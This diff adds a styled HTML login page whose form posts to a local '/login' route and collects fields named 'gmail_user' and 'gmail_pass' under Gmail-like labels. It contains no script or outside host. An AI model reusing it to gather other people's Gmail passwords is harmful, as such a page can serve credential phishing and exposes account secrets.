@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+    <style>
+        body {
+            background-image: url("https://img.freepik.com/free-vector/emails-concept-illustration_114360-1355.jpg?w=1060&t=st=1686228833~exp=1686229433~hmac=8b04bcad99055ce0ea0e1ce67e54743b327dcb1609fca489af735b24f5ec5841");
+            background-color: rgba(255, 0, 0, 0.5);
+            background-size: 100%;
+            background-position: center;
+        }
+
+        h1{
+            color: #609966;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            border: 1px solid #9DC08B;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); 
+            width: 350px;
+            padding: 50px;
+            text-align: center;
+        }
+
+        .login-card h1 {
+            font-size: 30px;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .login-card label {
+            display: block;
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        .login-card input[type="text"],
+        .login-card input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #e5e5e5;
+            border-radius: 10px;
+        }
+
+        .login-card input[type="submit"] {
+            width: 375px;
+            padding: 10px;
+            background-color: #609966;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .login-card input[type="submit"]:hover {
+            background-color: #9DC08B;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-card">
+            <h1>Login</h1>
+            <form action="/login" method="POST">
+                <label for="gmail_user">Email or phone:</label>
+                <input type="text" id="gmail_user" name="gmail_user" required>
+
+                <br><br>
+
+                <label for="gmail_pass">Password:</label>
+                <input type="password" id="gmail_pass" name="gmail_pass" required>
+
+                <br><br>
+
+                <input type="submit" value="Next">
+            </form>
+        </div>
+    </div>
+</body>
+</html>
